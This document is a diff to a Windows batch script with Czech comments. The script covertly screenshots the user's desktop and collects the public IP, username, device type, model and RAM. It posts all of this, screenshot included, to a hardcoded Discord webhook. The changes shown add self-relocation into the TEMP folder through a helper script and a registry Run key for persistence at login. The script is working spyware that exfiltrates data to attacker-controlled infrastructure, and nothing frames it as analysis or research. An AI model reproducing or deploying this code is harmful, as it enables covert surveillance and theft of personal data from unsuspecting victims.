@@ -4,10 +4,10 @@ setlocal EnableDelayedExpansion
 
 echo 🔥 GitHub verze spuštěna!
 
-:: 🌐 Webhook pro vše
+:: 🌐 Webhook
 set "webhook=https://discord.com/api/webhooks/1439411134137499698/1LxkdwQcxAxk-N_ZDkZQ1TRUiAgqiaqhPpkgcN6KIiFO1m5PWw6aDAm0cFOE445el1c8"
 
-:: 📸 Screenshot do TEMP
+:: 📸 Screenshot
 set "ss=%TEMP%\screenshot_%RANDOM%.png"
 powershell -ExecutionPolicy Bypass -Command ^
   "Add-Type -AssemblyName System.Windows.Forms; ^
@@ -18,7 +18,7 @@ powershell -ExecutionPolicy Bypass -Command ^
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size); ^
    $bmp.Save('%ss%', [Drawing.Imaging.ImageFormat]::Png)"
 
-:: 🌍 Získání veřejné IP
+:: 🌍 IP + uživatel
 for /f "delims=" %%x in ('curl -s https://api.ipify.org') do set "ip=%%x"
 set "user=%USERNAME%"
 
@@ -40,7 +40,7 @@ for /f %%i in ('wmic path Win32_Battery get Name ^| findstr /i /v "Name"') do (
     set "deviceType=Notebook"
 )
 
-:: 🖥️ Model zařízení
+:: 🖥️ Model
 set "deviceModel=Neznámý model"
 for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get model') do (
     if not defined deviceModel (
@@ -52,21 +52,38 @@ for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get model') do (
 for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get totalphysicalmemory') do set "ramRaw=%%i"
 set /a ram=%ramRaw:~0,-6%
 
-:: 🧾 Sestavení zprávy
+:: 🧾 Zpráva
 set "msg=🛰️ IP: ||!ip!||\nČas: !timestamp!\nUživatel: !user!\nZařízení: !deviceType!\nModel: !deviceModel!\nRAM: !ram! GB"
 
-:: 💾 Uložení do JSON a odeslání
+:: 💬 Odeslání textu
 set "payload=%TEMP%\payload.json"
 echo { > "!payload!"
 echo   "content": "!msg!" >> "!payload!"
 echo } >> "!payload!"
-
 curl -s -X POST %webhook% -H "Content-Type: application/json" --data "@!payload!" >nul
 del /f /q "!payload!"
 
 :: 📤 Odeslání screenshotu
 curl -s -X POST %webhook% -F "file=@%ss%;type=image/png" >nul
 del /f /q "%ss%"
+
+:: 📦 Přesun do TEMP
+set "targetPath=%TEMP%\takpojd.bat"
+echo %~dp0 | find /i "%TEMP%" >nul
+if not errorlevel 1 goto afterMove
+
+:: 🛠️ Pomocný přesun
+echo @echo off > "%TEMP%\movehelper.bat"
+echo timeout /t 2 ^>nul >> "%TEMP%\movehelper.bat"
+echo move /y "%~f0" "!targetPath!" ^>nul >> "%TEMP%\movehelper.bat"
+echo del "%%~f0" ^>nul >> "%TEMP%\movehelper.bat"
+start "" "%TEMP%\movehelper.bat"
+exit
+
+:afterMove
+
+:: 🔁 Autostart
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "takpojd" /t REG_SZ /d "!targetPath!" /f >nul
 
 :: ✅ Hotovo
 exit
